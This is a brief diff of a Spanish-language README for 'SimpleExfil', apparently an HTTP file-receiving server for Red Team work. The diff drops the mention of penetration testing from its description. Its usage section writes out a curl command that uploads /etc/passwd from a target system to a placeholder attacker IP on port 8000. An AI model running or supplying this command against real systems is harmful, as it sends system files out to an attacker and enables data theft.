@@ -1,5 +1,5 @@
 # SimpleExfil
-Un servidor HTTP simple para recepción de archivos diseñado para actividades de Red Team y Penetration Testing.
+Un servidor HTTP simple para recepción de archivos diseñado para actividades de Red Team.
 
 ### - Exfiltrar archivos desde sistema objetivo
 bash# curl -X POST -F "file=@/etc/passwd" http://[IP-ATACANTE]:8000
